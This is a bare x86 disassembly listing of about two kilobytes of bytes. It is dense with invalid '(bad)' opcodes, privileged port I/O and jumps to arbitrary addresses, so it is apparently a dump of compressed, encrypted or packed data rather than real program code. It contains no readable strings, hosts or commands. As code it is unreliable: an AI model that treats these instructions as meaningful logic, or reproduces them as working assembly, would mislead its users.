  411fa5:	leave  
  411fa6:	xchg   esi,eax
  411fa7:	(bad)  
  411fa8:	or     BYTE PTR [eax+0x37],ch
  411fab:	outs   dx,BYTE PTR ds:[esi]
  411fac:	in     eax,dx
  411fad:	or     BYTE PTR [edx+eiz*2],al
  411fb0:	push   esp
  411fb1:	mov    bh,0xfc
  411fb3:	rcl    BYTE PTR [edx-0x56],cl
  411fb6:	(bad)  
  411fb8:	pop    esp
  411fb9:	xor    eax,0x71833d07
  411fbe:	in     eax,dx
  411fbf:	test   eax,0xdec97bb9
  411fc4:	rol    al,1
  411fc6:	pop    edx
  411fc7:	cmp    ebx,DWORD PTR ds:[ebx+0x2462edca]
  411fce:	cmp    DWORD PTR [eax+ebx*4+0x5ba70ad0],0x50
  411fd6:	mov    dh,0x25
  411fd8:	mov    ch,0xfb
  411fda:	sbb    eax,0x62835c44
  411fdf:	jle    0x412016
  411fe1:	popa   
  411fe2:	pop    eax
  411fe3:	cli    
  411fe4:	fbld   TBYTE PTR ds:0xc72b5bdf
  411fea:	xor    DWORD PTR [ebx+0x62],ebp
  411fed:	and    eax,0xf5009a60
  411ff2:	stos   BYTE PTR es:[edi],al
  411ff3:	clc    
  411ff4:	data16 sahf 
  411ff6:	sub    DWORD PTR [edx+0x7f],esp
  411ff9:	inc    cl
  411ffb:	(bad)  
  411ffc:	test   BYTE PTR [eax+0x74d2fe28],0x6d
  412003:	je     0x412015
  412005:	std    
  412006:	push   edi
  412007:	dec    esp
  412008:	inc    edx
  412009:	mov    cl,BYTE PTR [ebx-0x15]
  41200c:	and    ah,BYTE PTR [edx+ebx*2]
  41200f:	ret    0x92eb
  412012:	xlat   BYTE PTR ds:[ebx]
  412013:	fcomp  QWORD PTR [edi-0xbc1d066]
  412019:	inc    esi
  41201a:	in     al,dx
  41201b:	sbb    edi,DWORD PTR [ebx]
  41201d:	push   eax
  41201e:	inc    esi
  41201f:	mov    cl,0xd3
  412021:	jns    0x411fc1
  412023:	stos   BYTE PTR es:[edi],al
  412024:	or     DWORD PTR [esi],0xffffff86
  412027:	lods   eax,DWORD PTR ds:[esi]
  412028:	cmp    BYTE PTR [esi-0x6d275c1e],0x96
  41202f:	in     eax,0x17
  412031:	push   edx
  412032:	add    BYTE PTR [edx+ecx*2],dh
  412035:	fmul   QWORD PTR [edx-0x21e1fe01]
  41203b:	cs out dx,al
  41203d:	mov    esp,0xd650d6b7
  412042:	arpl   si,bx
  412044:	sub    ch,ch
  412046:	cli    
  412047:	ret    
  412048:	mov    dl,0x23
  41204a:	lock ins DWORD PTR es:[edi],dx
  41204c:	mov    eax,0xbccee9b3
  412051:	jb     0x41206f
  412053:	add    al,0x65
  412055:	(bad)  
  412056:	in     al,dx
  412057:	add    DWORD PTR [esi],ecx
  412059:	(bad)  
  41205b:	mov    ds:0x9e5d63b,al
  412060:	fidivr DWORD PTR [eax-0x13abeb37]
  412066:	mov    ds:0x4178b651,eax
  41206b:	(bad)
  41206f:	and    eax,0xf52fb239
  412074:	fdivr  QWORD PTR ds:[ebx-0x7e]
  412078:	cli    
  412079:	stos   BYTE PTR es:[edi],al
  41207a:	pop    edx
  41207b:	mov    ah,0xe9
  41207d:	rol    ecx,1
  41207f:	fld    TBYTE PTR [edi-0x1c]
  412082:	dec    ecx
  412083:	iret   
  412084:	sbb    BYTE PTR [ecx+0x7e23411b],0xe5
  41208b:	jmp    0x4120c0
  41208d:	(bad)  
  41208e:	push   ecx
  41208f:	ins    BYTE PTR es:[edi],dx
  412090:	mov    dl,0x95
  412092:	fbld   TBYTE PTR [ebx+0x42e1e77c]
  412098:	stc    
  412099:	and    al,0x41
  41209b:	stc    
  41209c:	cmp    BYTE PTR [ecx-0x5b22027f],dh
  4120a2:	pop    ss
  4120a3:	leave  
  4120a4:	mov    esi,0xf97db328
  4120a9:	mov    dh,0x45
  4120ab:	je     0x4120c3
  4120ad:	cs cdq 
  4120af:	stos   BYTE PTR es:[edi],al
  4120b0:	(bad)  
  4120b1:	or     DWORD PTR ds:0xb4ab041e,ebx
  4120b7:	dec    eax
  4120b8:	xchg   esp,eax
  4120b9:	pop    esp
  4120ba:	inc    ebp
  4120bb:	mov    eax,0xb7f189a2
  4120c0:	aas    
  4120c1:	jmp    0x41206a
  4120c3:	xchg   ebp,eax
  4120c4:	mov    cl,BYTE PTR [ebx+0x6b7cdd84]
  4120ca:	outs   dx,DWORD PTR ds:[esi]
  4120cb:	inc    esi
  4120cc:	mov    ecx,0xa52f2549
  4120d1:	repz cmp BYTE PTR [eax-0x34],ah
  4120d5:	enter  0x466b,0x34
  4120d9:	mov    esp,0x5424783b
  4120de:	push   ds
  4120df:	xor    al,al
  4120e1:	out    0x4e,eax
  4120e3:	ins    DWORD PTR es:[edi],dx
  4120e4:	jle    0x41215c
  4120e6:	stos   BYTE PTR es:[edi],al
  4120e7:	test   eax,0xac917d61
  4120ec:	mov    BYTE PTR [edi],ch
  4120ee:	add    bl,BYTE PTR [bx-0x1715]
  4120f3:	jmp    0x60a786a2
  4120f8:	jg     0x4120f0
  4120fa:	daa    
  4120fb:	dec    ebp
  4120fc:	mov    ds:0x3bd9be22,eax
  412101:	pop    esi
  412102:	push   eax
  412103:	stos   BYTE PTR es:[edi],al
  412104:	sbb    ebp,DWORD PTR ds:0x154041ad
  41210a:	test   DWORD PTR [ebx-0x28],0x7888ea88
  412111:	je     0x41216f
  412113:	rcl    BYTE PTR [ecx],0xe
  412116:	test   eax,0xe4d746a5
  41211b:	xor    BYTE PTR [ebx+0x6bbd71f8],ch
  412121:	pop    edi
  412122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412123:	pop    ss
  412124:	inc    eax
  412125:	push   ss
  412126:	fisttp DWORD PTR ds:0xa5797de0
  41212c:	xchg   ecx,eax
  41212d:	(bad)  
  41212e:	jae    0x412180
  412130:	psubw  mm2,QWORD PTR [ecx-0x62c15df3]
  412137:	and    eax,0x5059ce5c
  41213c:	or     eax,0xa6e7cff0
  412141:	or     DWORD PTR [ebx-0x3aeab4ff],ecx
  412147:	xor    al,0x9
  412149:	hlt    
  41214a:	fiadd  WORD PTR [ebp-0x2c]
  41214d:	int3   
  41214e:	es dec esi
  412150:	aad    0xbe
  412152:	fisttp WORD PTR ds:0x292ee33a
  412158:	push   0xffffffb8
  41215a:	data16 jge 0x412121
  41215d:	inc    edi
  41215e:	inc    ecx
  41215f:	mov    ah,ah
  412161:	pop    ecx
  412162:	lods   al,BYTE PTR ds:[esi]
  412163:	xchg   esp,eax
  412164:	(bad)  
  412165:	jnp    0x41214e
  412167:	call   0x1cac:0x8481b1ca
  41216e:	pop    ecx
  41216f:	lods   eax,DWORD PTR ds:[esi]
  412170:	sub    DWORD PTR [esi+edx*8],0xfffffff0
  412174:	ss inc edx
  412176:	push   ds
  412177:	xchg   ecx,eax
  412178:	ret    
  412179:	xchg   DWORD PTR [esi-0x415d6d29],esp
  41217f:	or     DWORD PTR [edi-0x268905bf],ebx
  412185:	hlt    
  412186:	xor    eax,DWORD PTR [ebx-0x1804ede3]
  41218c:	cmp    BYTE PTR [ecx-0x31],cl
  41218f:	shr    BYTE PTR [ebp-0x7a1a57b8],0x23
  412196:	cmp    BYTE PTR [ebp-0x35049a25],cl
  41219c:	and    ebp,esp
  41219e:	mov    dl,0x13
  4121a0:	(bad)  
  4121a1:	xor    bl,cl
  4121a3:	adc    BYTE PTR [esi-0x63d42514],bh
  4121a9:	or     BYTE PTR [ebx+0x7c],dl
  4121ac:	mov    ah,0x4c
  4121ae:	out    0x1a,eax
  4121b0:	dec    esp
  4121b1:	js     0x4121d7
  4121b3:	sar    BYTE PTR [ebx+eiz*4+0x6cc60bf6],1
  4121ba:	jmp    0x4121de
  4121bc:	xor    BYTE PTR [edx+0x6b7f291a],bh
  4121c2:	mov    al,0x21
  4121c4:	sub    dl,0x9e
  4121c7:	xor    al,0xed
  4121c9:	dec    ecx
  4121ca:	js     0x4121d5
  4121cc:	outs   dx,DWORD PTR ds:[esi]
  4121cd:	mov    ah,0xc2
  4121cf:	pop    esp
  4121d0:	ss mov cl,0x78
  4121d3:	jmp    0x42fbbaee
  4121d8:	cmp    DWORD PTR [ebx+0x372d4c9e],eax
  4121de:	pop    ebx
  4121df:	fild   QWORD PTR [ecx-0x2d]
  4121e2:	(bad)  [esi]
  4121e4:	imul   edi,ebp,0x73
  4121e7:	push   es
  4121e8:	icebp  
  4121e9:	push   ebp
  4121ea:	out    0x1a,al
  4121ec:	add    al,0x70
  4121ee:	inc    ebx
  4121ef:	icebp  
  4121f0:	out    0xe6,eax
  4121f2:	xchg   edx,eax
  4121f3:	mov    esi,0x10240a40
  4121f8:	and    bh,BYTE PTR [ebx]
  4121fa:	cdq    
  4121fb:	daa    
  4121fc:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4121fe:	sbb    eax,0x54532644
  412203:	(bad)  
  412204:	icebp  
  412205:	aas    
  412206:	or     dl,BYTE PTR [esp+ebx*1]
  412209:	or     eax,DWORD PTR [esi+edx*1+0x7a795b37]
  412210:	pushf  
  412211:	into   
  412212:	jae    0x41221b
  412214:	es or  BYTE PTR ss:[esi],ch
  412218:	jmp    0x4121e2
  41221a:	jno    0x412284
  41221c:	scas   al,BYTE PTR es:[edi]
  41221d:	dec    edi
  41221e:	test   BYTE PTR [esi+0x4e48efbc],bl
  412224:	sahf   
  412225:	inc    esp
  412226:	pusha  
  412227:	test   eax,0x9e3e93c8
  41222c:	stos   BYTE PTR es:[edi],al
  41222d:	repz adc eax,0x6d3b4ab4
  412233:	add    al,0xe5
  412235:	cs daa 
  412237:	ins    BYTE PTR es:[edi],dx
  412238:	aas    
  412239:	and    edx,eax
  41223b:	xchg   ebx,eax
  41223c:	dec    esp
  41223d:	stc    
  41223e:	dec    ecx
  41223f:	fidivr DWORD PTR [ecx-0x7b73dc02]
  412245:	and    cl,BYTE PTR [eax]
  412247:	loopne 0x4121fd
  412249:	aad    0x60
  41224b:	sub    esp,0x3a82d9ce
  412251:	xchg   ecx,eax
  412252:	and    BYTE PTR [ebx-0x43],dl
  412255:	or     eax,ebx
  412257:	push   eax
  412258:	pop    eax
  412259:	cmc    
  41225a:	stc    
  41225b:	popf   
  41225c:	pop    ecx
  41225d:	loope  0x412273
  41225f:	pushf  
  412260:	dec    edi
  412261:	shl    eax,1
  412263:	repz daa 
  412265:	add    eax,0xcf8cb415
  41226a:	sub    eax,0x3fdb62ca
  41226f:	mov    eax,ss:0xd1576b67
  412275:	mov    BYTE PTR [edi+0x7c],dl
  412278:	xor    DWORD PTR [ebp+edx*4+0x67238613],eax
  41227f:	imul   edx,DWORD PTR [edi],0x5a
  412282:	(bad)  [edx+0x1b]
  412285:	pmaxsw mm5,QWORD PTR [edi+0x7b3f09c6]
  41228c:	retf   0x613e
  41228f:	pop    ss
  412290:	test   eax,0xbd1cc52
  412295:	pmaxub mm4,mm0
  412298:	mov    ebp,0x56197127
  41229d:	mov    ?,WORD PTR [edx+0x6]
  4122a0:	mov    cl,0x9a
  4122a2:	nop
  4122a3:	lock outs dx,DWORD PTR ds:[esi]
  4122a5:	stos   DWORD PTR es:[edi],eax
  4122a6:	inc    ebp
  4122a7:	jbe    0x412310
  4122a9:	loope  0x412309
  4122ab:	and    edi,DWORD PTR [edi+0x24]
  4122ae:	and    eax,0xc0df9bd7
  4122b3:	cld    
  4122b4:	sbb    BYTE PTR [eax],0xcc
  4122b7:	sbb    di,WORD PTR [ebp+eiz*4+0x5969cdfa]
  4122bf:	dec    edi
  4122c0:	push   cs
  4122c1:	mov    esi,0xed66f977
  4122c6:	jo     0x412269
  4122c8:	shr    al,cl
  4122ca:	(bad)  
  4122cb:	xchg   esi,eax
  4122cc:	in     eax,0x68
  4122ce:	scas   al,BYTE PTR es:[edi]
  4122cf:	or     al,0x6
  4122d1:	ja     0x4122e1
  4122d3:	cmp    DWORD PTR [ecx+0x7a0617d5],0xffffffeb
  4122da:	mov    al,0xca
  4122dc:	ret    
  4122dd:	push   es
  4122de:	ret    
  4122df:	dec    eax
  4122e0:	mov    al,0x15
  4122e2:	pop    ecx
  4122e3:	cs pop esi
  4122e5:	inc    esp
  4122e6:	pop    esi
  4122e7:	push   edx
  4122e8:	jmp    0x41234c
  4122ea:	jno    0x412290
  4122ec:	mov    dh,0xd0
  4122ee:	pop    esi
  4122ef:	outs   dx,DWORD PTR ds:[esi]
  4122f0:	imul   esi,esi,0x8638371d
  4122f6:	icebp  
  4122f7:	sar    edi,cl
  4122f9:	jnp    0x41235d
  4122fb:	(bad)  
  4122fd:	or     esi,ebx
  4122ff:	ins    DWORD PTR es:[edi],dx
  412300:	push   ds
  412301:	shl    BYTE PTR [ebp+0x32f8cb65],cl
  412307:	adc    esi,DWORD PTR [ebx+0x31]
  41230a:	rcr    BYTE PTR [esi],cl
  41230c:	xor    al,0x41
  41230e:	in     al,dx
  41230f:	mov    al,0x7b
  412311:	(bad)  
  412312:	(bad)  
  412313:	mov    bh,0x45
  412315:	cld    
  412316:	push   0x23
  412318:	ror    BYTE PTR [eax+0x1e],cl
  41231b:	cmp    eax,0xe39e628c
  412320:	pushf  
  412321:	call   0x2c3:0xba429594
  412328:	or     BYTE PTR [eax-0x65b42980],ch
  41232e:	mov    ebp,0xbd41d288
  412333:	mov    edx,0x8de712aa
  412338:	into   
  412339:	xchg   edx,eax
  41233a:	lea    ebx,[ebx+0x4d]
  41233d:	dec    edx
  41233e:	jo     0x412397
  412340:	dec    esi
  412341:	and    DWORD PTR [eax-0x4cdc142a],edx
  412347:	jb     0x412347
  412349:	mov    esi,0x8b100467
  41234e:	pop    ss
  41234f:	inc    eax
  412350:	cmp    al,0x3b
  412352:	mov    dl,0x21
  412354:	jne    0x412382
  412356:	stos   BYTE PTR es:[edi],al
  412357:	test   DWORD PTR [ecx+0x1beaedf7],esp
  41235d:	lds    ebx,FWORD PTR [ebp-0x54]
  412360:	jns    0x4123da
  412362:	imul   DWORD PTR ds:[ebp+0x6b]
  412366:	or     eax,0xe9cd47ca
  41236b:	lock inc edi
  41236d:	jmp    0x74c3107
  412372:	xchg   esp,edi
  412374:	mov    esp,0x400ec221
  412379:	cmp    al,0xe5
  41237b:	inc    ecx
  41237c:	pop    edx
  41237d:	shl    BYTE PTR [ecx+0x56fa94b7],0x4e
  412384:	neg    BYTE PTR [ecx-0x73e2c993]
  41238a:	ja     0x412346
  41238c:	loopne 0x41233b
  41238e:	mov    cl,0xb9
  412390:	mov    ebp,0xbe423483
  412395:	in     eax,dx
  412396:	pop    esp
  412397:	mov    eax,ds:0xcb7521d3
  41239c:	stos   DWORD PTR es:[edi],eax
  41239d:	clc    
  41239e:	pop    eax
  41239f:	in     al,dx
  4123a0:	and    al,0xea
  4123a2:	lahf   
  4123a3:	dec    esi
  4123a4:	adc    ah,BYTE PTR [ebp+0x27]
  4123a7:	push   esi
  4123a8:	and    al,0x78
  4123aa:	or     BYTE PTR [edx],0x36
  4123ad:	mov    BYTE PTR [edx],dh
  4123af:	mov    ch,0xba
  4123b1:	out    0x3b,al
  4123b3:	jl     0x412409
  4123b5:	mov    edx,0x7753030b
  4123ba:	adc    eax,0xae4fe6ea
  4123bf:	jae    0x412354
  4123c1:	mov    ecx,0xb43068f1
  4123c6:	xchg   ebx,eax
  4123c7:	mov    cr6,ebp
  4123ca:	sub    eax,0xb0f0d6e
  4123cf:	in     al,dx
  4123d0:	lods   eax,DWORD PTR ds:[esi]
  4123d1:	dec    esi
  4123d2:	fisubr WORD PTR [ebx-0x29aca7fa]
  4123d8:	push   es
  4123d9:	xchg   ebp,eax
  4123da:	mov    bh,0xd7
  4123dc:	and    BYTE PTR [ebp-0x50],bl
  4123df:	gs mov eax,ss
  4123e2:	push   cs
  4123e3:	cmc    
  4123e4:	sub    ebp,DWORD PTR [ecx+0x65]
  4123e7:	add    al,BYTE PTR [ebx-0xa]
  4123ea:	or     DWORD PTR [esp+ecx*1+0x5d92216d],0x8c49c0a0
  4123f5:	ds push esi
  4123f7:	jae    0x41243e
  4123f9:	cmc    
  4123fa:	dec    ebx
  4123fb:	icebp  
  4123fc:	pop    edx
  4123fd:	stos   BYTE PTR es:[edi],al
  4123fe:	adc    ecx,DWORD PTR [ebx-0x37a06a0]
  412404:	icebp  
  412405:	mov    DWORD PTR [ecx+eax*8+0xc4ae825],edi
  41240c:	es dec ecx
  41240e:	les    esi,FWORD PTR [ebx+eiz*2-0x62]
  412412:	cmp    DWORD PTR [esi-0x40],0x0
  412416:	adc    eax,0xcf62db03
  41241b:	outs   dx,BYTE PTR ds:[esi]
  41241c:	pusha  
  41241d:	sub    edi,DWORD PTR [edx-0x7eff0de1]
  412423:	sub    ah,bl
  412425:	mov    edi,0x38a8b78c
  41242a:	retf   
  41242b:	ret    0x7c5f
  41242e:	idiv   BYTE PTR [eax+ebp*2]
  412431:	sbb    ebp,ebp
  412433:	inc    ecx
  412434:	fwait
  412435:	loop   0x41247a
  412437:	adc    eax,0xadff6d8f
  41243c:	int    0x25
  41243e:	rcr    DWORD PTR [eax],cl
  412440:	jl     0x4124b2
  412442:	sbb    al,0x8b
  412444:	nop
  412445:	cmp    esp,ebp
  412447:	cmp    ch,cl
  412449:	adc    cl,al
  41244b:	jg     0x41249e
  41244d:	loopne 0x41243a
  41244f:	stos   BYTE PTR es:[edi],al
  412450:	popa   
  412451:	xchg   esi,eax
  412452:	lods   al,BYTE PTR ds:[esi]
  412453:	push   ds
  412454:	(bad)  
  412456:	mov    esi,DWORD PTR [ecx+edx*2+0x69]
  41245a:	ss neg esi
  41245d:	xor    BYTE PTR [eax+0x27bab7b0],bh
  412463:	pop    esi
  412464:	cmp    edx,DWORD PTR [ecx]
  412466:	add    ch,BYTE PTR ss:[esi+eiz*1-0x2a]
  41246b:	push   ecx
  41246c:	mov    bh,0x69
  41246e:	fsub   DWORD PTR [esi+0x7]
  412471:	xchg   ebx,eax
  412472:	mov    ebp,ss
  412474:	add    DWORD PTR [esi],0xffffff8c
  412477:	pop    es
  412478:	out    0xd9,al
  41247a:	div    BYTE PTR [ebx]
  41247c:	mov    ebp,ebp
  41247e:	fwait
  41247f:	test   eax,0x90fb52a4
  412484:	inc    esp
  412485:	mov    BYTE PTR [ecx+0x2f],cl
  412488:	inc    ebp
  412489:	jo     0x412411
  41248b:	add    eax,0x14ff7b23
  412490:	lds    edi,FWORD PTR [eax-0x66]
  412493:	push   eax
  412494:	in     eax,dx
  412495:	xor    eax,0x84e62a50
  41249a:	es xchg ebx,eax
  41249c:	test   al,0xe4
  41249e:	out    0xa0,al
  4124a0:	xor    DWORD PTR [edx],0x40ed92d5
  4124a6:	div    DWORD PTR [ebx-0x40a20bfd]
  4124ac:	ds pop ebp
  4124ae:	mov    ecx,0xeaa888e7
  4124b3:	xor    DWORD PTR [edi],0x4e
  4124b6:	dec    ebx
  4124b7:	pusha  
  4124b8:	inc    eax
  4124b9:	sbb    DWORD PTR [esi],esi
  4124bb:	dec    eax
  4124bc:	adc    DWORD PTR [ecx+eax*1-0x4e72bc6e],ebx
  4124c3:	dec    eax
  4124c4:	mov    eax,0xa468cc33
  4124c9:	fld    st(4)
  4124cb:	dec    edx
  4124cc:	cmp    BYTE PTR [esi+0x79],cl
  4124cf:	call   0x7bb16647
  4124d4:	jmp    0xe68cd0a3
  4124d9:	shr    DWORD PTR [edi+eax*1],cl
  4124dc:	imul   eax,DWORD PTR [edx-0x283e3a52],0xe63ca34c
  4124e6:	mov    dl,0x8c
  4124e8:	ret    0xd5c2
  4124eb:	test   bl,ah
  4124ed:	rol    BYTE PTR [ebx],1
  4124ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124f0:	dec    ecx
  4124f1:	in     eax,dx
  4124f2:	or     ebx,DWORD PTR [ebx+0x799868f3]
  4124f8:	repnz pusha 
  4124fa:	lock xor eax,0xfac5d6f4
  412500:	cmp    DWORD PTR [ecx+0x73],ebp
  412503:	sbb    ebx,DWORD PTR [eax-0x323d0326]
  412509:	sbb    eax,0xe89353c5
  41250e:	(bad)  
  41250f:	fld    TBYTE PTR [ecx-0x46]
  412512:	mov    esp,edx
  412514:	les    edi,FWORD PTR ss:[esi+0x74621b19]
  41251b:	and    eax,0xd1beefbd
  412520:	jecxz  0x4124fd
  412522:	mov    BYTE PTR [ebp-0x49ea2baf],cl
  412528:	jne    0x4124ae
  41252a:	fsubr  DWORD PTR [eax+0x3]
  41252d:	int    0xc7
  41252f:	fdivr  DWORD PTR [ecx]
  412531:	jne    0x41255a
  412533:	mov    eax,cs
  412535:	cmp    DWORD PTR [eax-0x2cfb2b70],ebp
  41253b:	cdq    
  41253c:	pop    edi
  41253d:	push   edi
  41253e:	(bad)  
  41253f:	idiv   BYTE PTR [ebx+0x21]
  412542:	outs   dx,BYTE PTR ds:[esi]
  412543:	neg    WORD PTR [ecx+0x7a]
  412547:	jne    0x4124cf
  412549:	adc    al,cl
  41254b:	(bad)  
  41254c:	jg     0x41252a
  41254e:	and    DWORD PTR [esi],eax
  412550:	dec    esp
  412551:	mov    bh,0x9
  412553:	out    dx,eax
  412554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412555:	test   al,0x6e
  412557:	sar    DWORD PTR [esi+0xa],cl
  41255a:	cli    
  41255b:	jo     0x4125cf
  41255d:	mov    esi,0xd29b735b
  412562:	mov    edi,DWORD PTR [esi-0x2c]
  412565:	inc    ecx
  412566:	mov    edx,0x184c6581
  41256b:	xor    ebx,DWORD PTR [ecx+0x23]
  41256e:	aad    0xfb
  412570:	xchg   edi,eax
  412571:	je     0x412539
  412573:	(bad)  
  412574:	pusha  
  412575:	ret    
  412576:	and    DWORD PTR [edx],esp
  412578:	retf   
  412579:	bound  edi,QWORD PTR [ebx+0x27]
  41257c:	mov    ds:0x35b9217,al
  412581:	pusha  
  412582:	adc    BYTE PTR [eax-0x52eb716e],al
  412588:	push   edi
  412589:	jl     0x412515
  41258b:	xchg   ebx,eax
  41258c:	mov    esi,0xc14c73ea
  412591:	mov    dh,bl
  412593:	dec    esi
  412594:	lahf   
  412595:	pushf  
  412596:	test   al,0x95
  412598:	sti    
  412599:	push   ss
  41259a:	dec    esp
  41259b:	mov    ebx,edx
  41259d:	lock stc 
  41259f:	xor    esi,DWORD PTR [edi+ebx*4+0x606b3b7c]
  4125a6:	dec    edx
  4125a7:	repnz adc BYTE PTR [esi+0x223f96ff],cl
  4125ae:	mov    ebp,0x27fcfced
  4125b3:	add    eax,0xfffffff3
  4125b6:	sbb    bh,dh
  4125b8:	inc    ecx
  4125b9:	push   edi
  4125ba:	sub    edx,DWORD PTR [edx+edi*1]
  4125bd:	out    0x22,eax
  4125bf:	push   ss
  4125c0:	retf   0x1bdd
  4125c3:	mov    DWORD PTR [esi+0x7e522dcc],edx
  4125c9:	inc    esp
  4125ca:	or     eax,DWORD PTR [ecx+eiz*8]
  4125cd:	cmp    eax,0xa43731a3
  4125d2:	leave  
  4125d3:	or     BYTE PTR [edx-0x43ee4504],bh
  4125d9:	or     edx,0xffffff93
  4125dc:	sbb    BYTE PTR [eax+esi*2-0x2909e05e],0x9e
  4125e4:	add    BYTE PTR [ebp+0x2d],ch
  4125e7:	pop    ebx
  4125e8:	pop    es
  4125e9:	outs   dx,DWORD PTR ds:[esi]
  4125ea:	sub    ah,BYTE PTR [ebp*2+0x1d59862f]
  4125f1:	mov    ch,0xc3
  4125f3:	jg     0x4125f5
  4125f5:	pop    eax
  4125f6:	jp     0x41260c
  4125f8:	mov    WORD PTR ds:0x899c655b,ds
  4125fe:	dec    esi
  4125ff:	xor    DWORD PTR [edi],edx
  412601:	push   cs
  412602:	inc    edx
  412603:	sbb    BYTE PTR [edx-0x4e],dl
  412606:	lods   al,BYTE PTR ds:[esi]
  412607:	pop    es
  412608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412609:	cli    
  41260a:	(bad)  
  41260b:	shr    BYTE PTR [ecx+0x4cbc18a0],0x9c
  412612:	xlat   BYTE PTR ds:[ebx]
  412613:	aas    
  412614:	add    edi,0xe8dd3202
  41261a:	or     al,0xeb
  41261c:	lahf   
  41261d:	(bad)  
  41261e:	int3   
  41261f:	mov    ss,WORD PTR [edi]
  412621:	inc    edx
  412622:	push   ecx
  412623:	or     BYTE PTR [edi-0x782e96e1],0xf6
  41262a:	pop    ds
  41262b:	(bad)  
  41262c:	sbb    BYTE PTR ds:0x94c2ac59,dh
  412632:	enter  0x75a2,0xe0
  412636:	dec    ebx
  412637:	xor    dl,dh
  412639:	and    ebx,ebx
  41263b:	add    dl,0x5a
  41263e:	adc    BYTE PTR [ecx],bh
  412640:	lahf   
  412641:	das    
  412642:	cmp    BYTE PTR [edi-0x166db2ad],dl
  412648:	xor    dl,0x1d
  41264b:	push   ebx
  41264c:	push   ebp
  41264d:	(bad)  
  41264e:	test   al,0x83
  412650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412651:	mov    ah,0x34
  412653:	icebp  
  412654:	sub    al,0x73
  412656:	push   esp
  412657:	pop    esp
  412658:	push   esi
  412659:	cmp    al,0x6e
  41265b:	mov    esp,0x773fe982
  412660:	mov    DWORD PTR [edi+0x56],eax
  412663:	sub    eax,0x343a6a5c
  412668:	push   esi
  412669:	shl    eax,0x24
  41266c:	cmp    bl,BYTE PTR [ecx+0x202c2a36]
  412672:	add    al,dl
  412674:	fwait
  412675:	xchg   esp,eax
  412676:	push   0x2c
  412678:	xchg   esi,eax
  412679:	loope  0x412694
  41267b:	popf   
  41267c:	popf   
  41267d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41267e:	jno    0x4126ef
  412680:	fwait
  412681:	sub    edi,DWORD PTR [eax-0x3ef32651]
  412687:	pushf  
  412688:	xchg   esp,eax
  412689:	push   edi
  41268a:	ret    
  41268b:	sar    BYTE PTR ds:0x12c762d7,cl
  412691:	popa   
  412692:	call   0xcdd97e54
  412697:	mov    esp,0xc09b577b
  41269c:	into   
  41269d:	ss std 
  41269f:	out    0x4b,eax
  4126a1:	lds    ebx,FWORD PTR [ebp-0x31]
  4126a4:	(bad)  
  4126a6:	ins    BYTE PTR es:[edi],dx
  4126a7:	test   ecx,ecx
  4126a9:	aam    0xe8
  4126ab:	xor    DWORD PTR [eax+0x1b],eax
  4126ae:	mov    ah,0xf0
  4126b0:	mov    BYTE PTR [ebx],0xe7
  4126b3:	call   0xe6259f58
  4126b8:	or     eax,0x16613479
  4126bd:	inc    edx
  4126be:	jl     0x412643
  4126c0:	in     al,dx
  4126c1:	mov    esp,0x9aeabb7e
  4126c6:	sub    esi,eax
  4126c8:	adc    eax,0x7e852b85
  4126cd:	push   cs
  4126ce:	das    
  4126cf:	lahf   
  4126d0:	mov    ch,BYTE PTR [edx+0x12]
  4126d3:	xchg   DWORD PTR [ebp+0x5d],esi
  4126d6:	lods   eax,DWORD PTR ds:[esi]
  4126d7:	jmp    0xf9eb:0x5b854445
  4126de:	sub    eax,0x85591a6d
  4126e3:	add    al,0x50
  4126e5:	jo     0x412756
  4126e7:	aas    
  4126e8:	popa   
  4126e9:	dec    esp
  4126ea:	cmp    bl,BYTE PTR [ebx+0x30b939cc]
  4126f0:	inc    bl
  4126f2:	jmp    0xdbec251a
  4126f7:	and    BYTE PTR [esp+ecx*2-0x3a],bh
  4126fb:	fsubr  QWORD PTR [eax-0x4d4926f5]
  412701:	loope  0x41271d
  412703:	outs   dx,BYTE PTR ds:[esi]
  412704:	pop    esp
  412705:	adc    eax,0x66e9b49d
  41270a:	gs sbb al,0x1
  41270d:	pop    ds
  41270e:	call   FWORD PTR [ebx-0x1e6c3909]
  412714:	test   BYTE PTR [edx-0x30],ah
  412717:	add    BYTE PTR [ebx-0x42788bcb],bh
  41271d:	pusha  
  41271e:	imul   edi,DWORD PTR [edx+0x73],0xffffffee
  412722:	scas   al,BYTE PTR es:[edi]
  412723:	out    0x58,al
  412725:	xchg   BYTE PTR [esi+0x17766285],dh
  41272b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41272c:	mov    ebp,0xa8910f00
  412731:	or     eax,0x74248f36
  412736:	mov    ecx,DWORD PTR [edi+ebx*2-0x7ae61486]
  41273d:	sub    ah,BYTE PTR [ecx+0x4421ad2d]
  412743:	cli    
  412744:	mov    WORD PTR [edx-0x2016871d],ds
  41274a:	xchg   ebp,eax
  41274b:	shrd   ebp,ebx,cl
  41274e:	dec    ebx
  41274f:	les    ebp,FWORD PTR [ecx+edi*2+0x519ee7b]
  412756:	sbb    cl,BYTE PTR [eax+0x6e]
  412759:	mov    dl,bh
  41275b:	jbe    0x4126ea
  41275d:	rcr    esi,1
  41275f:	fstp   DWORD PTR [ebx+0x34861f24]
  412765:	ror    esp,cl
  412767:	lahf   
  412768:	cmc    
  412769:	lahf   
  41276a:	push   edx
  41276b:	shl    BYTE PTR [esi+edi*2+0x7b46618b],0xa4
  412773:	popf   
  412774:	test   DWORD PTR [esp+ebx*1+0x7b1d5ca5],edi
  41277b:	test   DWORD PTR [ebp+0x7e],eax
  41277e:	xor    cl,0xfb
  412781:	inc    edi
  412782:	jle    0x4127d5
  412784:	fs jp  0x4127e6
  412787:	lahf   
  412788:	or     dh,bh
  41278a:	sar    BYTE PTR [esi+0x52b8e326],1
  412790:	imul   edi,DWORD PTR [edx-0x2017f993],0x88974d1
  41279a:	jns    0x4127c4
  41279c:	add    edi,ebp
  41279e:	test   al,0x2
  4127a0:	xchg   esi,eax
  4127a1:	sub    DWORD PTR [ebp+0x26],esp
  4127a4:	mov    ebx,0xe5845e59
  4127a9:	loop   0x41281b
  4127ab:	dec    edi
  4127ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127ad:	push   eax
  4127ae:	xchg   esp,eax
